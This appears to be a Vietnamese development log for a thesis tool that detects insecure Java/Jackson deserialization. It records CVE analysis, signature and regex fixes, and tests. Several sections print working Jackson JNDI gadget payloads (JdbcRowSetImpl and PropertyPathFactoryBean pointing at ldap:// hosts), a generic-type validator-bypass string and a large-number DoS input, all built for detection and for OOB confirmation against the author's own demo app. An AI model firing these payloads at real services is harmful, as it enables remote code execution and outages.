KHÔNG tạo được callback LDAP thật trên target chạy jackson-databind có blacklist nội bộ đầy đủ (>= khoảng
2.8.10, bao gồm 2.13.5 của `java-app` demo) — vì 2 gadget JNDI quen thuộc đã bị chặn kép. Payload này vẫn
có giá trị thật với: (a) target dùng version jackson-databind CŨ hơn (trước khi 2 class này được thêm vào
blacklist cứng, khoảng < 2.8.9), hoặc (b) 1 gadget JNDI khác chưa nằm trong `DEFAULT_NO_DESER_CLASS_NAMES`
(chưa tìm, ngoài phạm vi hiện tại). Đã KHÔNG sửa code `java-app` để né blacklist nội bộ của Jackson (vd
đổi sang version cũ hơn) — giữ nguyên bản 2.13.5 thật vì đây chính là phát hiện trung thực, có giá trị học
thuật hơn (chứng minh rõ 2 tầng phòng thủ độc lập) so với việc "làm cho chạy bằng mọi giá".

---

**[CÂN NHẮC NHƯNG CỐ TÌNH LOẠI — CVE-2026-68497, quyết định rõ ràng kèm lý do, để trả lời được khi bị hỏi phản biện]**

Tra thật qua NVD API (`services.nvd.nist.gov`, không suy đoán): `jackson-databind` bind thẳng 1 JSON
string vào `javax.xml.datatype.Duration`/`XMLGregorianCalendar` qua `DatatypeFactory.newDuration()`/
`newXMLGregorianCalendar()` (`CoreXMLDeserializers.Std._deserialize`) — 2 hàm JDK này dựng số bằng
`BigInteger(String)`/`BigDecimal(String)`, độ phức tạp **bậc 2** theo số chữ số. Vì số nằm trong JSON
STRING token (không phải JSON number token), guard `StreamReadConstraints.maxNumberLength` của
jackson-core **không áp dụng được** — gửi 1 request vài MB (chuỗi `"P999...9Y"` vài triệu chữ số) tốn
hàng chục giây-vài phút CPU đơn luồng. CVSS 3.1 **7.5 HIGH** (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`),
CWE-400. Published 2026-09-11, fix tại `GHSA-q4xh-88c3-wmh7` (jackson-databind commit `a99b7e74c`).
**Không cần polymorphic typing/cấu hình đặc biệt** — `ObjectMapper` trơn cũng dính, vì 2 deserializer
này đăng ký mặc định.

Verify: payload thử `{"duration":"P999...9Y"}` qua `Fingerprint` → `Unknown` — signature hiện tại
không nhận diện được (đúng, vì không có wrapper `["class",{...}]`/`@class` nào cả, chỉ là field JSON
thường).

**QUYẾT ĐỊNH (đã hỏi trực tiếp user, không tự ý)**: **KHÔNG thêm vào tool.** Lý do: đây là
**Denial-of-Service (CWE-400)**, khác hẳn mục tiêu "object injection/RCE" (CWE-502) mà toàn bộ pipeline
(PHP unserialize, Java ObjectInputStream, Jackson polymorphic typing, Pickle, YAML, .NET, Node/Ruby
Marshal) đang nhắm tới. Dù cùng đi qua cơ chế Jackson deserialization, đây là loại tác động khác hẳn,
không khớp phạm vi "insecure deserialization → khai thác" của thesis. Giữ nguyên scope, không mở rộng
sang DoS/resource-exhaustion.

---

**[FIX QUAN TRỌNG — phát hiện khi user hỏi về CVE mới] `JACKSON_PATTERNS` bị CVE-2026-54512/54513 (GHSA-j3rv-43j4-c7qm, CVSS 8.1, công bố NVD 23/06/2026) bypass hoàn toàn — ĐÃ SỬA.**

**Lỗ hổng (đọc advisory thật qua WebFetch GitHub, không suy đoán)**: `PolymorphicTypeValidator` của
jackson-databind khi gặp type ID có generic (`<...>`) chỉ kiểm tra **tên container trước dấu `<`**, bỏ
qua hoàn toàn type parameter bên trong. Attacker nhét 1 class bị cấm làm generic argument của 1
container ĐƯỢC CHO PHÉP — vd `"java.util.ArrayList<com.evil.EvilGadget>"` (ArrayList được allow, nhưng
`EvilGadget` lẽ ra bị chặn thì lại lọt qua vì validator không nhìn vào bên trong `<...>`). Ảnh hưởng
`jackson-databind` **2.10.0 đến 2.18.7**, 2.19.0-2.21.3, 3.0.0-3.1.3 — **bao gồm đúng bản 2.13.5** mà
`java-app` đang dùng (qua Spring Boot 2.7.18 BOM, đã verify ở plan dưới) — **KHÔNG CẦN pin version cũ
hơn nữa, 2.13.5 hiện tại đã dính CVE này ngay từ đầu.**

**Gap thật trong tool (verify bằng code, không đoán)**: payload PoC của advisory
`["java.util.ArrayList<com.evil.EvilGadget>",[{"cmd":"id"}]]` chạy qua `Fingerprint` → kết quả
`type: "Unknown", subtype: null, risk_level: "Low"` — **signature cũ hoàn toàn bỏ lỡ**. Nguyên nhân:
regex `JACKSON_PATTERNS` cũ (`[A-Z][\w$]*"` — lớp ký tự `\w$` không chứa `<`) khớp xong tên class
`ArrayList` thì kỳ vọng dấu `"` ngay sau, nhưng gặp `<` trước → regex fail toàn bộ match.

**Fix**: thêm 3 pattern mới vào [signatures.py](Utility/signatures.py) `JACKSON_PATTERNS`, cho phép
`<[^"]*>"` sau tên class (bắt mọi biến thể generic mà advisory liệt kê: list element, map key, map
value, nested list, array element — vì tất cả chỉ khác nhau ở nội dung bên trong `<...>`, không cần
pattern riêng cho từng loại).

Verify thật — cả 6 biến thể advisory liệt kê (+ 1 kết hợp với gadget thật `JdbcRowSetImpl` thay vì
`EvilGadget` placeholder) đều route đúng `subtype: "Jackson Polymorphic Typing"` sau fix. Test mới:
`TestCVE2026_54512_GenericTypeBypass` (7 test, kèm 1 test no-regression cho pattern cũ không có `<`).
Suite: **95/95 pass**.

**Nguồn tham khảo**: GHSA-j3rv-43j4-c7qm (https://github.com/advisories/GHSA-j3rv-43j4-c7qm), fix thật ở
jackson-databind issue #5988 (commit `434d6c511`) — fix validate đệ quy qua PTV, trừ `Object`/`Enum`.

---

**[THÊM] Gadget thứ 3 cho `JACKSON_OOB_GADGETS`: `com.mchange.v2.c3p0.JndiRefForwardingDataSource` (c3p0).**

Verify từ source thật `mbechler/marshalsec` `Jackson.java` `makeRefDataSource()`: field phẳng, đơn
giản y hệt `JdbcRowSetImpl` — `{"jndiName":"ldap://X/a","loginTimeout":"0"}`. Giờ tool sinh **3**
payload OOB-confirmation cho Jackson (trước là 2). Verify: `json.loads()` cả 3 không lỗi, test suite
**88/88 pass**.

**[QUYẾT ĐỊNH PHẠM VI — 4 gadget còn lại trong 7 gadget `marshalsec.Jackson`, LÝ DO KHÁC NHAU cho từng cái, không phải "ngại làm":**

| Gadget | Vì sao KHÔNG thêm |
|---|---|
| `DefaultBeanFactoryPointcutAdvisor` (Spring) | Phải bọc **2 instance trong 1 `java.util.HashSet`** (`writeCollection(HashSet.class, obj1, obj2)`, 1 object rỗng) — kỹ thuật hash-collision để ép JVM tự gọi `equals()`/`hashCode()` lúc insert. CHƯA trace được chính xác vì sao cần đúng 2 instance để hoạt động — sau bài học payload `PropertyPathFactoryBean` thiếu field `beanFactory` (xem mục dưới), chủ động KHÔNG đoán mò field này khi chưa verify chắc cơ chế. |
| `WrapperConnectionPoolDataSource` (c3p0) | Cần tham số `codebase`+`class` — cơ chế tải `.class` từ xa qua HTTP (kiểu RMI codebase), không phải JNDI lookup đơn thuần. Phải tự host 1 file `.class` thật ở server HTTP — đúng loại hạ tầng "server độc hại" đã xác định KHÔNG làm. |
| `UnicastRemoteObject` | Source tự ghi `@Args(minArgs = 0, noTest = true) // random port only` — không nhận tham số JNDI URL nào, không có domain để nhét OOB canary vào. |
| `TemplatesImpl` (XSLT) | Source tự ghi `noTest = true // chỉ chạy <JDK 8u45 HOẶC có upstream xalan` — RCE tự chứa bytecode XSLT, không qua JNDI, cơ chế hoàn toàn khác (build `.class`, nhúng bytecode base64) — không khớp mẫu "đổi 1 domain" của 3 gadget đã thêm. |

---

**[PLAN — NGÀY MAI, ĐÃ CẬP NHẬT] Tạo test case thật cho Jackson, test thử với CVE cụ thể trên `java-app`.**

**Đổi hướng so với bản plan gốc (xem mục [FIX QUAN TRỌNG] CVE-2026-54512 ở đầu file)**: KHÔNG CẦN pin
`jackson-databind` về version cũ nữa. `java-app` đang dùng 2.13.5 (qua Spring Boot 2.7.18 BOM, đã verify
từ `spring-boot-dependencies-2.7.18.pom`) — version này **nằm ngay trong khoảng bị ảnh hưởng của
CVE-2026-54512** (2.10.0-2.18.7). Tức là chỉ cần endpoint có bật `PolymorphicTypeValidator` dạng allow-
list (vd allow `java.util.ArrayList`) + generic type ID, gadget bị chặn tên (`JdbcRowSetImpl`,
`PropertyPathFactoryBean`...) vẫn lọt qua được bằng cách nhúng vào generic argument — **thực tế hơn
nhiều** so với phương án cũ (pin version cổ 2017), vì đây là lỗ hổng 2026 còn rất mới trên chính version
hiện có, không cần giả lập app cổ.

**Việc cần làm ngày mai, theo thứ tự:**

1. **Đọc kỹ GHSA-j3rv-43j4-c7qm + jackson-databind issue #5988** (chưa đọc sâu, mới chỉ đọc tóm tắt qua
   WebFetch) để hiểu chính xác: `BasicPolymorphicTypeValidator` dùng allow-list kiểu gì trong PoC gốc,
   và điều kiện chính xác để `_resolveAndValidateGeneric()` bị kích hoạt (có bắt buộc
   `include = As.WRAPPER_ARRAY` + `use = Id.CLASS` như PoC hay cách khác cũng được).

2. **Thêm endpoint Jackson thật vào `java-app`**, dùng ĐÚNG cấu hình PoC advisory: `ObjectMapper` với
   `@JsonTypeInfo(use = Id.CLASS, include = As.WRAPPER_ARRAY)` trên 1 field kiểu `Object`, PTV allow-list
   kiểu "chỉ cho `java.util.ArrayList`" (trông có vẻ an toàn — đây chính là điểm hay của CVE này: allow-
   list tưởng chặt nhưng vẫn bypass được). Field giá trị đọc trực tiếp từ JSON body request. Không cần
   dùng gadget JdbcRowSetImpl/PropertyPathFactoryBean bị chặn tên — thử trước với gadget đã bị
   `SubTypeValidator` chặn tên tường minh để chứng minh đúng bypass CVE này (không phải lỗ hổng cấu hình
   allow-list lỏng lẻo thông thường).
   - **BẮT BUỘC thêm UI trigger thật** cho endpoint này (theo [feedback-new-api-must-be-used-in-web]) —
     không chỉ làm endpoint test bằng curl.

3. **Thêm payload generation cho CVE-2026-54512 vào `payloadMutation.py`** (việc chưa làm — hiện
   `_mutate_jackson_oob()` chỉ sinh payload wrapper THƯỜNG, chưa có biến thể generic-bypass): thêm 1 bộ
   gadget mới dạng `"java.util.ArrayList<{gadget_class}>"` bọc quanh `JdbcRowSetImpl`/
   `PropertyPathFactoryBean`/`JndiRefForwardingDataSource` đã có — tái dùng field/cấu trúc property cũ,
   chỉ đổi type ID string bên ngoài. Verify lại bằng `json.loads()` như các gadget trước.

3. **Test end-to-end với EthicalQuoc**:
   - Capture HAR qua UI mới → `scan` → `analyze` → `assess` — xác nhận pipeline tự nhận ra
     `subtype = "Jackson Polymorphic Typing"`, sinh đúng 3 payload OOB.
   - Chạy thật với `oob_domain` trỏ Interactsh — xác nhận có callback LDAP/DNS thật trong log Interactsh
     (không chỉ giả định) — đây là bước khác biệt so với trước giờ (các case Jackson mới chỉ test bằng
     payload tĩnh, chưa bắn thật vào target đang chạy).
   - Viết test case mới trong `TestCase/` cho luồng end-to-end này (hiện `TestJacksonPolymorphicDetection`
     chỉ test đơn vị, chưa có test tích hợp với HAR/target thật).

4. **CVE cụ thể để tham chiếu khi viết báo cáo/luận văn**: CVE-2017-7525 (bug gốc jackson-databind #1599,
   gadget qua c3p0 — bài viết tham khảo đã thấy trong source `makeTemplates()`:
   https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/). Cần tự đọc writeup này
   trước khi trích dẫn trong báo cáo (chưa đọc, chỉ mới thấy link trong comment source).

5. Sau khi xong, ghi lại `note.md` như thường lệ: version Jackson đã pin + lý do, endpoint mới, kết quả
   live test (có/không nhận được callback), test case mới thêm.

---

**[GHI CHÉP KIẾN THỨC — Q&A phiên này, phục vụ ôn lại khi bảo vệ luận văn]**

1. **`JAVA_CHAIN_MAP` trong `payloadMutation.py` KHÔNG phải "sink → gadget"** — key (`CommonsCollections`,
   `TemplatesImpl`, `Spring`...) được so khớp với `exploit_type` (mô tả), không phải với sink. Toàn bộ map
   chỉ phục vụ **1 sink duy nhất** (`ObjectInputStream.readObject()`), chỉ khác nhau ở CHỌN chain nào của
   `ysoserial`. Jackson nằm NGOÀI map này hoàn toàn (route riêng qua `jackson_manual`), vì Jackson đọc
   JSON — không thể nhét byte `ysoserial` sinh ra vào được.

2. **Vì sao Jackson "cứ dính JNDI"**: Jackson default/polymorphic typing chỉ gọi được **setter/constructor
   một lần** khi bind JSON — KHÔNG có cơ chế callback dây chuyền như `readObject()` của Java serialization
   (không có `hashCode()`→`LazyMap`→`ChainedTransformer` nhiều tầng). Muốn RCE, attacker cần 1 class có
   sẵn trên classpath mà **chỉ 1 lần gọi setter đã tự gây hại** — nhóm lớp JNDI datasource
   (`JdbcRowSetImpl`, `PropertyPathFactoryBean`, c3p0...) là nhóm PHỔ BIẾN DUY NHẤT thoả điều kiện này
   (bản thân setter tự gọi `InitialContext().lookup()`). Không phải Jackson "thích" JNDI về bản chất — mà
   JNDI là nhóm lớp tiện lợi nhất có sẵn. Bằng chứng ngược lại: `TemplatesImpl` KHÔNG tự kích hoạt bằng
   setter (cần gọi `newTransformer()` — bước 2), nên phải mượn thêm lớp `BadAttributeValueExpException`
   (có `toString()` tự gọi `val.toString()`) làm "trampoline" giả lập callback chain — xác nhận qua file
   thật `Finereport_Jackson.java` (plugin `Java-Chains/chains-plugin-demo`): comment ghi rõ
   `"BadAttributeValueExpException -> jackson -> Templates"`.

3. **`InitialContext().lookup(url)` — `url` ở đây không phải URL tuỳ ý**, mà là tham số `getDataSourceName()`
   (tên biến theo spec JDBC `RowSet`). JNDI có cơ chế "URL Context Factory": nếu chuỗi có dạng
   `scheme://host/path` (`ldap://`, `rmi://`, `dns://`...), `lookup()` tự nhận diện và forward tra cứu ra
   naming service ở ĐÚNG địa chỉ đó thay vì tra nội bộ — đây chính là cơ chế RCE (và cũng là cơ chế
   Log4Shell `${jndi:ldap://...}`). Verify bằng source thật OpenJDK
   `com.sun.rowset.JdbcRowSetImpl.connect()` dòng 612-629: `ctx.lookup(getDataSourceName())`.

4. **Detect Jackson KHÔNG cần JNDI** — `JACKSON_PATTERNS` trong `finderprint.py` chỉ match HÌNH DẠNG JSON
   (`["class",{...}]`/`@class`/`@type`), không có `jndi`/`ldap` trong pattern. Bằng chứng: payload
   `["java.util.ArrayList",[1,2,3]]` (không hề có JNDI) vẫn được detect đúng subtype "Jackson Polymorphic
   Typing". JNDI chỉ cần cho bước XÁC NHẬN khai thác thật (OOB callback) — 2 việc tách biệt hoàn toàn.

5. **Thuật ngữ trang Interactsh là "LDAP", không phải "JNDI"** — verify từ README thật
   `projectdiscovery/interactsh`: mục `## LDAP Interaction`, flag CLI `-ldap`, log `[LDAP] Listening on...`.
   "JNDI" chỉ xuất hiện 1 lần, trong ngữ cảnh liệt kê kỹ thuật tấn công phía client (không phải tên dịch
   vụ). Lý do: Interactsh là hạ tầng TẦNG MẠNG (DNS/HTTP/SMTP/LDAP) — không biết và không cần biết tầng
   ứng dụng phía trên (JNDI của Java) đã dùng cách nào kích hoạt ra kết nối đó. JNDI (API Java) → tạo kết
   nối LDAP → Interactsh (lắng nghe giao thức) chỉ log gói LDAP thô.

6. **`GadgetBuilder` (NordSec 2025, Umeå University, Bruno Kreyssig et al.) — đọc trực tiếp PDF paper**:
   là bản overhaul/thay thế `ysoserial` (gộp 31 chain ysoserial + 29 chain nguồn khác = 303 biến thể nhờ
   tách 3 fragment Trampoline/MainChain/SinkAdapter), nhưng **CHỈ xoay quanh sink `ObjectInputStream`**,
   không nhắc gì tới Jackson/JSON — không giải quyết được bài toán Jackson của mình. Quyết định: KHÔNG
   tích hợp (research artifact quá mới, chưa kiểm chứng rộng, không giải quyết đúng vấn đề đang vướng).

7. **`vulhub/java-chains`** — đã cố đọc source engine thật (`git clone` đúng tag `v2.0.0-beta7` mà
   `deps/api/README.md` ghi là nguồn build API) — xác nhận: **repo công khai hoàn toàn KHÔNG có code
   `.java`** nào (chỉ docs/Docker/CI), kể cả đúng tag đó. Commit mới nhất ghi thẳng "fix public release
   surface verification" — repo được dọn có chủ đích để chỉ phơi bề mặt release. Engine thật (logic build
   gadget chain, `GadgetChain.doCreate()`) là CLOSED-SOURCE, chỉ phân phối dạng `.jar` đã compile. Phần
   công khai duy nhất đọc được là plugin SDK demo (`Java-Chains/chains-plugin-demo`) — code GỌI VÀO API đã
   compile sẵn, không phải implementation.

---

**[THÊM] Jackson `jackson_manual` giờ sinh payload OOB-CONFIRMATION-ONLY (không còn `return []`), cùng mẫu với `_mutate_yaml_java()` (SnakeYAML Java) đã có từ trước.**

Lý do: detect Jackson (`JACKSON_PATTERNS`) không hề cần JNDI — chỉ cần đúng hình dạng JSON
(`["class",{...}]`/`@class`). JNDI chỉ cần cho bước xác nhận khai thác thật qua tín hiệu OOB
(callback LDAP/DNS quan sát qua Interactsh/Collaborator) — tách biệt hoàn toàn khỏi bước detect.
Verify nguồn thật `com.sun.rowset.JdbcRowSetImpl.connect()` (OpenJDK, dòng 612-629):
`ctx.lookup(getDataSourceName())` — nếu giá trị set vào có dạng URL JNDI (`ldap://`, `rmi://`...),
JNDI tự forward lookup ra server ngoài do attacker kiểm soát → đây chính là cơ chế RCE.

**Thêm `_mutate_jackson_oob()`** trong [payloadMutation.py](Analyze/payloadMutation.py), wire vào
`mutate()` cho `probe == "jackson_manual"`:
- Không có `oob_domain` cấu hình → trả về `[{"error": ..., "hint": ...}]` (giống style báo lỗi các
  nhánh khác khi thiếu config/tool).
- Có `oob_domain` → sinh 2 payload JSON (`JdbcRowSetImpl` + `PropertyPathFactoryBean`, 2 gadget phổ
  biến nhất trong 7 gadget `marshalsec.Jackson` đã liệt kê ở mục dưới), `dataSourceName`/
  `targetBeanName` trỏ `ldap://{oob_domain}/a`. Mỗi payload có note ghi rõ: **chỉ xác nhận có
  deserialize xảy ra qua tín hiệu OOB, KHÔNG tự đạt RCE** — vì cần thêm rogue LDAP/RMI server trả
  `Reference` + host sẵn 1 class độc hại, nằm ngoài phạm vi tool (tool không tự dựng/chạy server đó).
- Không gọi `java`/subprocess nào — chỉ string JSON + base64, giống hệt cách `_mutate_java_urldns()`
  build canary DNS.

Test: thêm `test_jackson_probe_without_oob_domain_returns_no_payload` và
`test_jackson_probe_with_oob_domain_generates_confirmation_payload_only` (thay cho test cũ
`test_jackson_probe_generates_no_auto_payload` đã khóa hành vi `return []` — nay không còn đúng).
Docstring class `TestJacksonPolymorphicDetection` cũng viết lại cho khớp. Verify thật bằng script
độc lập (set `ETHICALQUOC_OOB_DOMAIN=abc123.oast.fun`): payload base64 decode ra đúng
`["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://abc123.oast.fun/a","autoCommit":true}]`.
Suite: **88/88 pass**.

**[FIX NGAY SAU ĐÓ — tự phát hiện lỗi khi bị hỏi "tham khảo ở đâu hay tự chế"]** Payload
`PropertyPathFactoryBean` ban đầu CHỈ có `targetBeanName`+`propertyPath` — bị thiếu field bắt buộc
`beanFactory` (nested `SimpleJndiBeanFactory` với `shareableResources`). Không có field này thì
`targetBeanName` chỉ là 1 chuỗi vô hại, **không có gì thật sự gọi JNDI** — payload ban đầu KHÔNG hoạt
động, dù JdbcRowSetImpl (payload còn lại) đã verify đúng từ trước. Phát hiện bằng cách `git clone`
thật `mbechler/marshalsec`, đọc `Jackson.java` dòng 106-112 (`makePropertyPathFactory`) +
dòng 134-136 (`makeSpringJndiBeanFactory`) + dòng 281-285 (`writeProperty` — xác nhận field lồng
được nhúng dạng mảng JSON thật, không phải chuỗi escape). Cấu trúc đúng, đã verify + sửa:
```json
["org.springframework.beans.factory.config.PropertyPathFactoryBean",
 {"targetBeanName":"ldap://X/a","propertyPath":"foo",
  "beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",
                 {"shareableResources":["ldap://X/a"]}]}]
```
Verify lại: JSON hợp lệ (`json.loads()` không lỗi), test suite **88/88 pass** không đổi (test không
hard-code field cũ nên không vỡ, nhưng cũng không tự phát hiện được lỗi thiếu field này — ghi chú để
nhớ: lần sau cần test assert đủ field bắt buộc của gadget, không chỉ assert "có domain trong payload").

---

**[FIX] `normalize()` vứt bỏ wrapper Jackson — bug đã nêu ở mục dưới (dòng "GIỚI HẠN KIẾN TRÚC") NAY ĐÃ SỬA.**

Nguyên nhân chính xác (verify bằng cách in điểm số thật, không đoán): `_serialized_score()` trong
[normalize.py](Analyze/normalize.py) chấm cả cục wrapper `["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://x/a",...}]`
= **0.0 điểm** (với nó đây chỉ là JSON thường, `_is_generic_json()` = True), trong khi chuỗi lá
`"ldap://x/a"` được **0.5 điểm** (khớp `WRAPPER_DANGEROUS`). Lá cao điểm hơn → `collapse()` giữ lá, vứt
wrapper → `Fingerprint` (chạy sau normalize) không còn thấy dấu hiệu Jackson.

Fix — 2 chỗ:
- [normalize.py](Analyze/normalize.py) `_serialized_score()`: thêm luật nếu khớp `signatures.JACKSON_PATTERNS`
  thì **+8 điểm**. Giờ wrapper (8đ) > lá (0.5đ) → `normalize()` giữ nguyên cả wrapper.
- [finderprint.py](Analyze/finderprint.py) `_detect_java()`: khi khớp `JACKSON_PATTERNS`, **ép** `subtype =
  "Jackson Polymorphic Typing"` (trước đó dùng `subtype = subtype or ...` — nhường cho gadget keyword như
  `springframework`/`ldap` khớp trước). Lý do: cấu trúc wrapper quyết định TRANSPORT (JSON qua Jackson), nên
  dù bên trong chứa gadget Spring/JNDI keyword, vẫn phải báo đúng là Jackson — vì `ysoserial` không tạo ra
  được payload dạng JSON này.

Verify thật — 3 payload test lại:
| Payload | Trước fix | Sau fix |
|---|---|---|
| `["com.sun.rowset.JdbcRowSetImpl",{...ldap...}]` | normalize còn lại `ldap://x/a` → nhãn sai "JNDI Injection"/ysoserial | giữ nguyên wrapper → đúng "Jackson Polymorphic Typing" / probe `jackson_manual` |
| `{"@class":"org.springframework...PropertyPathFactoryBean",...}` | nhãn sai "Spring Gadget"/ysoserial | đúng "Jackson Polymorphic Typing" / `jackson_manual` |
| `{"username":"wiener","role":"user"}` (JSON thường) | Unknown | vẫn Unknown (không false-positive) |

Test: `test_known_limitation_normalize_strips_jackson_wrapper` (khóa hành vi CŨ, nay sai) đã đổi tên/viết lại
thành `test_real_gadget_wrapper_survives_normalize_and_is_detected` (khóa hành vi ĐÚNG). Suite: **87/87 pass**.

Phần sinh payload khai thác Jackson (`mutate()` với probe `jackson_manual`) **vẫn** rơi vào `return []` —
detection-only, không đổi. Lý do giữ nguyên detection-only: xem mục research "Java-Chains/marshalsec" bên
dưới.

---

**[RESEARCH — so sánh công cụ, phục vụ bảo vệ luận văn] Vì sao Jackson chỉ detection-only là lựa chọn hợp
lý, không phải thiếu sót — đối chiếu với 2 công cụ ngoài, đọc source/README thật, không suy đoán.**

1. **`marshalsec.Jackson`** (đọc trực tiếp `Jackson.java` từ `mbechler/marshalsec`, branch `master`):
   đúng **7 gadget chain** — `makeJdbcRowSet` (JdbcRowSetImpl, JNDI), `makePropertyPathFactory` (Spring,
   JNDI), `makeBeanFactoryPointcutAdvisor` (Spring, JNDI), `makeRefDataSource` (c3p0, JNDI),
   `makeWrapperConnPool` (c3p0, tải class qua URL — không cần JNDI), `makeUnicastRemoteObject` (RMI,
   `noTest=true`), `makeTemplates` (TemplatesImpl/XSLT, tự chứa nhưng `noTest=true` — chỉ chạy JDK <8u45
   hoặc Xalan upstream). **5/7 cần JNDI server ngoài, 1/7 cần HTTP server ngoài, 1/7 tự chứa nhưng không ổn
   định** — khớp đúng 1-1 với `JACKSON_DANGEROUS_CLASSES` đã có trong [signatures.py](Utility/signatures.py)
   (không thiếu class nào). Tức là ngay cả tác giả marshalsec cũng không coi gadget Jackson nào "tự động,
   đáng tin cậy 100%".

2. **`vulhub/java-chains`** (đọc README + CHANGELOG thật, 2.2k star, bản `2.0.0-beta3`): là **cả một
   platform** (không phải lib) — bundle sẵn web UI + server JNDI HTTP/LDAP/RMI + FakeMySQL + JRMP listener
   chạy kèm, đứng trên vai ysoserial + marshalsec + ysomap + JNDIMap + MemShellParty + PPPYSO. Từ
   `1.4.1`: có cả Fastjson. Từ `2.0.0-beta3`: có `/api` (session + `X-Api-Token`) và `java-chains-cli` để
   tự động hoá. Đây chính là thứ **giải quyết được** khoảng trống "hạ tầng rogue JNDI/RMI/HTTP server" mà
   marshalsec một mình không làm (marshalsec chỉ cho class `LDAPRefServer`/`RMIRefServer`, còn phải tự host
   HTTP server + class độc hại).

**Ý nghĩa cho thesis**: một đội mã nguồn mở với nhiều người đóng góp, nhiều năm phát triển, phải xây **hẳn
một platform riêng** mới giải quyết trọn vẹn bài toán "tự động hoá payload + hạ tầng JNDI/Jackson end-to-
end". Điều này củng cố quyết định phạm vi: để Jackson ở mức **detection-only** trong tool thesis là lựa
chọn có cơ sở so sánh thực tế, không phải do thiếu khả năng — có thể trích dẫn java-chains làm ví dụ khi
bảo vệ, nếu bị hỏi "sao không tự exploit Jackson luôn".

**Tài liệu tham khảo (nguồn gốc, để tra lại sau này):**
- marshalsec — source code: https://github.com/mbechler/marshalsec
  - File đã đọc trực tiếp: https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/Jackson.java
  - Paper gốc giới thiệu kỹ thuật (Moritz Bechler & Christian Schneider, 2017): "Java Unmarshaller Security" — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf (đã verify link tồn tại, HTTP 200 — chưa tự đọc nội dung paper)
- vulhub/java-chains — repo: https://github.com/vulhub/java-chains
  - README (bản tiếng Anh đã đọc): https://github.com/vulhub/java-chains/blob/main/README.md
  - CHANGELOG (lịch sử tính năng, đã đọc để xác nhận Fastjson + `/api` + CLI): https://github.com/vulhub/java-chains/blob/main/CHANGELOG.md
  - Docs site (link README ghi, lúc truy cập bị 404 — lưu ý nếu tra lại): https://java-chains.github.io/en/docs/guide → redirect https://java-chains.vulhub.org/en/docs/guide
- Các project java-chains credit (chưa tự đọc source, chỉ biết qua README credit — nếu cần trích dẫn sâu hơn thì phải tự đọc):
  - https://github.com/ReaJason/MemShellParty
  - https://github.com/wh1t3p1g/ysomap
  - https://github.com/qi4L/JYso
  - https://github.com/X1r0z/JNDIMap
  - https://github.com/Whoopsunix/PPPYSO

**Giới hạn ngoài phạm vi, xác nhận lại, không thay đổi**: không tích hợp marshalsec/java-chains để tool tự
sinh payload JNDI RCE hoàn chỉnh — việc này đòi hỏi tool phải tự dựng rogue LDAP/RMI/HTTP server và serve
class độc hại, nằm ngoài phạm vi một tool phát hiện (detection), đúng ranh giới mà các Burp extension cộng
đồng (Freddy, Java-Deserialization-Scanner — xem mục bên dưới) cũng tự đặt ra.

---

**[THÊM — DETECTION-ONLY] Nhận diện Jackson default/polymorphic typing (chỉ PHÁT HIỆN, KHÔNG auto-sinh payload khai thác). Kèm 1 giới hạn kiến trúc đã xác nhận thật — ĐÃ SỬA, xem entry [FIX] ở đầu file.**

**Đã thêm:**
- [signatures.py](Utility/signatures.py): `JACKSON_PATTERNS` (WRAPPER_ARRAY `["pkg.Class",{...}]`, `@class`/`@type`) + `JACKSON_DANGEROUS_CLASSES` (jdbcrowsetimpl, templatesimpl, propertypathfactorybean, c3p0...). Thêm Jackson vào `looks_like_serialized()` để payload JSON Jackson lọt qua filter.
- [finderprint.py](Analyze/finderprint.py) `_detect_java()`: nếu khớp `JACKSON_PATTERNS` → subtype "Jackson Polymorphic Typing", +5 điểm (+4 nếu có dangerous class).
- [ExploitabilityAnalysis.py](Analyze/ExploitabilityAnalysis.py) `_analyze_java()`: nếu subtype là Jackson → exploit_type "Jackson Polymorphic Deserialization", probe `jackson_manual`, note hướng dẫn tự dùng marshalsec.Jackson. KHÔNG route sang ysoserial.
- `mutate()`: `jackson_manual` rơi vào `return []` — detection-only, KHÔNG weaponize tự động (phần sinh payload RCE Jackson KHÔNG làm).
- Test: thêm `TestJacksonPolymorphicDetection` (3 test). Suite: **87/87 pass**.

**GIỚI HẠN KIẾN TRÚC đã xác nhận THẬT — ĐÃ SỬA (xem entry [FIX] ở đầu file), giữ nguyên đoạn dưới đây làm hồ sơ debug gốc:** `DataNormalizer.normalize()` làm phẳng JSON + rút các chuỗi lá rồi chấm điểm giữ cái "đáng giá" nhất, **vứt bỏ wrapper + tên class Jackson**. Verify thật: `normalize('["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://x/a",...}]')` → trả về đúng `["ldap://x/a"]`. Nên với payload gadget Jackson THẬT (JdbcRowSetImpl+ldap, Spring PropertyPathFactoryBean), `Fingerprint` (chạy SAU normalize) không còn thấy dấu hiệu Jackson → signature không khớp. Các payload đó vẫn bị flag nhưng qua `ldap://`/`springframework` keyword → gắn nhãn "JNDI Injection"/"Spring Gadget" + probe ysoserial (SAI transport, SAI gợi ý công cụ vì ysoserial không tạo được JSON Jackson). Signature Jackson chỉ thắng khi wrapper sống sót qua normalize (payload không có chuỗi lá điểm cao hơn, vd `["java.util.ArrayList",[1,2,3]]`). Muốn fix đúng cần detect Jackson TRƯỚC normalize (trên `cleaned_value`) — động vào luồng chung main.py/debug_pipeline, để sau. `test_known_limitation_normalize_strips_jackson_wrapper` khóa lại hành vi hiện tại để ai sửa normalize sau này thấy nó đổi.

**Phần KHÔNG làm:** tích hợp marshalsec để tool TỰ sinh payload khai thác Jackson (RCE) — ngoài phạm vi, không thực hiện. Endpoint Jackson vulnerable trong java-vuln-app + UI trigger cũng chưa thêm (chưa có target thật để verify live detection).

**[PHÁT HIỆN THÊM] `marshalsec` — công cụ lấp đúng khoảng trống Hessian/Kryo/Castor/BlazeDS/SnakeYAML/XStream mà `ysoserial` không làm được. Hiện tool KHÔNG tích hợp cái này — giới hạn thật, đã xác nhận bằng cách clone source (`mbechler/marshalsec`), không suy đoán.**

